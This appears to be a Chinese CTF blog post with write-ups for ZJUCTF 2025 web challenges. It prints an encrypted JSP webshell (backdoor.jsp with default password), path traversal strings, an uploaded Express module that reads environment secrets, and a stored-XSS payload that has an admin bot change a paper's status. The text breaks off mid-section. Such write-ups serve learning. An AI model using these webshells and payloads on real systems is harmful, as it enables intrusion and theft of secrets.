<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>zjuctf2025 | cheng_xing's blog</title><meta name="robots" content="noindex"><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web选择大于努力真正的恶意代码在BOOT-INF&#x2F;lib&#x2F;views-jar-0.0.1-SNAPSHOT.jar里 里面有 JSP 视图：META-INF&#x2F;resources&#x2F;WEB-INF&#x2F;jsp&#x2F;backdoor.jsp 123456789101112131415161718192021222324&lt;%@page impor">
<meta property="og:type" content="article">
<meta property="og:title" content="zjuctf2025">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/11/17/zjuctf2025/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="Web选择大于努力真正的恶意代码在BOOT-INF&#x2F;lib&#x2F;views-jar-0.0.1-SNAPSHOT.jar里 里面有 JSP 视图：META-INF&#x2F;resources&#x2F;WEB-INF&#x2F;jsp&#x2F;backdoor.jsp 123456789101112131415161718192021222324&lt;%@page impor">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-11-17T11:37:53.000Z">
<meta property="article:modified_time" content="2025-12-28T08:40:25.735Z">
<meta property="article:author" content="cheng_xing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "zjuctf2025",
  "url": "https://sakuraraindrop.github.io/2025/11/17/zjuctf2025/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-11-17T11:37:53.000Z",
  "dateModified": "2025-12-28T08:40:25.735Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/11/17/zjuctf2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'zjuctf2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">72</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">163</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">zjuctf2025</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">zjuctf2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-17T11:37:53.000Z" title="发表于 2025-11-17 19:37:53">2025-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-28T08:40:25.735Z" title="更新于 2025-12-28 16:40:25">2025-12-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2025线上赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="选择大于努力"><a href="#选择大于努力" class="headerlink" title="选择大于努力"></a>选择大于努力</h3><p>真正的恶意代码在BOOT-INF&#x2F;lib&#x2F;views-jar-0.0.1-SNAPSHOT.jar里</p>
<p>里面有 JSP 视图：<br>META-INF&#x2F;resources&#x2F;WEB-INF&#x2F;jsp&#x2F;backdoor.jsp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!<span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">    String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    <span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class="line">    session.setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">    Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader())</span><br><span class="line">        .g(</span><br><span class="line">            c.doFinal(</span><br><span class="line">                Base64.getDecoder().decode(</span><br><span class="line">                    request.getReader().readLine()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">        .newInstance()</span><br><span class="line">        .equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>所以用冰蝎直接连&#x2F;backdoor即可，用默认密码rebeyond</p>
<p>ZJUCTF{i_don’t_know_but_i_have_tools_all_in_one_f726c7ba87c9}</p>
<h3 id="你说你不懂-Linux"><a href="#你说你不懂-Linux" class="headerlink" title="你说你不懂 Linux"></a>你说你不懂 Linux</h3><p>几个关键点</p>
<ul>
<li>windows中也可以用&#x2F;作为分隔符</li>
<li>windows对大小写不敏感</li>
<li>结尾的点号会被忽略</li>
</ul>
<p>?file&#x3D;1.log&#x2F;..&#x2F;..&#x2F;..&#x2F;FLAG.TXT.</p>
<p>ZJUCTF{don’t_say_you_are_unfamiliar_with_paths_again!_5ec6b6481191}</p>
<h3 id="一觉醒来全世界计"><a href="#一觉醒来全世界计" class="headerlink" title="一觉醒来全世界计"></a>一觉醒来全世界计</h3><p>抓个包把用时改为-1即可</p>
<p>ZJUCTF{are_you_really_primary_school_student_9fde4d4fd725}</p>
<h3 id="ezjs-revenge"><a href="#ezjs-revenge" class="headerlink" title="ezjs-revenge"></a>ezjs-revenge</h3><p>登录用admın&#x2F;123456绕过<br>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14569">https://xz.aliyun.com/news/14569</a><br>传一个.ejs上去，然后&#x2F;render?filename&#x3D;&#x2F;即可</p>
<p>ZJUCTF{8lOG_MUsT_8e_RI9HT_\0&#x2F;<em>\o&#x2F;</em>\o&#x2F;}</p>
<h3 id="ezjs-revenge-revenge"><a href="#ezjs-revenge-revenge" class="headerlink" title="ezjs_revenge_revenge"></a>ezjs_revenge_revenge</h3><p>登录同上题</p>
<p>step1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: localhost:61234</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:61234/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: connect.sid=s%3AcqJRDApgL3XhW-ERm_RaE2muoI9k0Zht.0H9maGzrAO4Bgmi0bpNMOXz%2B6U4m1XQHOFhmPSx6NzU</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=BOUNDARY</span><br><span class="line">Content-Length: 353</span><br><span class="line"></span><br><span class="line">--BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileInput&quot;; filename=&quot;aaa&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">exports.__express = function (filePath, options, cb) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    const flag = process.env.FLAG || require(&#x27;fs&#x27;).readFileSync(&#x27;/proc/self/environ&#x27;);</span><br><span class="line">    cb(null, flag.toString());</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    cb(null, e.stack);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">--BOUNDARY--</span><br></pre></td></tr></table></figure>

<p>step2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: localhost:61234</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://localhost:61234/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: connect.sid=s%3AcqJRDApgL3XhW-ERm_RaE2muoI9k0Zht.0H9maGzrAO4Bgmi0bpNMOXz%2B6U4m1XQHOFhmPSx6NzU</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=BOUNDARY</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">--BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileInput&quot;; filename=&quot;pwn.aaa&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line">--BOUNDARY--</span><br></pre></td></tr></table></figure>

<p>step3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rename?oldPath=aaa&amp;newPath=../../node_modules/aaa</span><br></pre></td></tr></table></figure>

<p>step4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/render?filename=pwn.aaa</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{7h1S_Is_tH3_L4ST_Reu3Nge_QAQ}</p>
<h3 id="Submit-Your-Paper"><a href="#Submit-Your-Paper" class="headerlink" title="Submit Your Paper!"></a>Submit Your Paper!</h3><p>只有访问的自己的paper且这篇paper的status为Accept时，才会得到flag<br>所以目标很清晰：让自己的一篇paper变成Accept状态</p>
<p>admin&#x2F;list.ejs中存在存储型XSS注入点</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="title function_">layout</span>(<span class="string">&#x27;layout&#x27;</span>) %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>All Papers (Admin)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>User<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Abstract<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Status<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Actions<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;% papers.forEach(p =&gt; &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">tr</span> <span class="attr">data-paper-id</span>=<span class="string">&quot;&lt;%= p.id %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&lt;%= p.id %&gt;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&lt;%= p.username %&gt;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  &lt;% const tid = &#x27;abs&#x27; + p.id; %&gt;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;&lt;%= tid %&gt;-preview&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &lt;%- p.abstract.length &gt; 100 </span></span><br><span class="line"><span class="language-xml">          ? p.abstract.substring(0,100) + &#x27;…&#x27; </span></span><br><span class="line"><span class="language-xml">          : p.abstract %&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;% if (p.abstract.length &gt; 100) &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;small&quot;</span> <span class="attr">data-bs-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&lt;%= tid %&gt;&quot;</span> <span class="attr">role</span>=<span class="string">&quot;button&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;false&quot;</span> <span class="attr">aria-controls</span>=<span class="string">&quot;&lt;%= tid %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        Show more</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse mt-1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&lt;%= tid %&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &lt;%- p.abstract %&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;% &#125; %&gt;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &lt;% </span></span><br><span class="line"><span class="language-xml">            let cls = &#x27;secondary&#x27;;</span></span><br><span class="line"><span class="language-xml">            if (p.status===&#x27;Early Reject&#x27;) cls=&#x27;danger&#x27;;</span></span><br><span class="line"><span class="language-xml">            else if (p.status===&#x27;Major Revision&#x27; || p.status===&#x27;Minor Revision&#x27;) cls=&#x27;warning text-dark&#x27;;</span></span><br><span class="line"><span class="language-xml">            else if (p.status===&#x27;Accept&#x27;) cls=&#x27;success&#x27;;</span></span><br><span class="line"><span class="language-xml">            else if (p.status===&#x27;Under Review&#x27;) cls=&#x27;info&#x27;;</span></span><br><span class="line"><span class="language-xml">          %&gt;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge bg-&lt;%= cls %&gt;&quot;</span>&gt;</span>&lt;%= p.status %&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/admin/papers/&lt;%= p.id %&gt;/view&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm btn-primary&quot;</span>&gt;</span>View<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/admin/papers/&lt;%= p.id %&gt;/status&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm btn-warning&quot;</span>&gt;</span>Change Status<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;% &#125;) %&gt;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>使用 <code>&lt;%- p.abstract %&gt;</code>，直接执行插入js代码。</p>
<p>因此用如下payload放在abstract里，等admin bot审稿时会执行这段js代码，将paper设为Accept状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;script&gt;fetch(&#x27;/admin/papers/&#x27;+document.currentScript.closest(&#x27;tr&#x27;).dataset.paperId+&#x27;/status&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;status=Accept&#x27;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>最后访问&#x2F;papers&#x2F;1&#x2F;view即可</p>
<h3 id="Bython-is-not-P"><a href="#Bython-is-not-P" class="headerlink" title="Bython is not P"></a>Bython is not P</h3><p>上传os.by劫持sandbox中的import os<br>os.by</p>
